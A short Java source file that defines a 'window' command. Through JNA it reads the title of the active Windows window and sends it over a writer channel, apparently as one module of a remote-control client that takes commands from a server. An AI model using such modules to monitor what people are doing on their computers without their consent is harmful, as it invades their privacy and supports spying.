package Client.command.commands;

import Client.command.Command;

import com.sun.jna.Native;
import com.sun.jna.platform.win32.WinDef;
import com.sun.jna.win32.StdCallLibrary;

import java.io.BufferedReader;
import java.io.PrintWriter;
import java.util.ArrayList;


public class Window extends Command {
    public Window() {
        super("window", "shows the active window title", "window");
    }

    public interface User32 extends StdCallLibrary {
        User32 INSTANCE = (User32) Native.loadLibrary("user32", User32.class);
        WinDef.HWND GetForegroundWindow();
        void GetWindowTextW(WinDef.HWND hWnd, char[] lpString, int nMaxCount);
    }


    @Override
    public void run(ArrayList<String> args, BufferedReader recive, PrintWriter send) {
        char[] buffer = new char[1024 * 2];
        User32.INSTANCE.GetWindowTextW(User32.INSTANCE.GetForegroundWindow(), buffer, 1024);
        send.println("Active window title: " + Native.toString(buffer));
    }
}

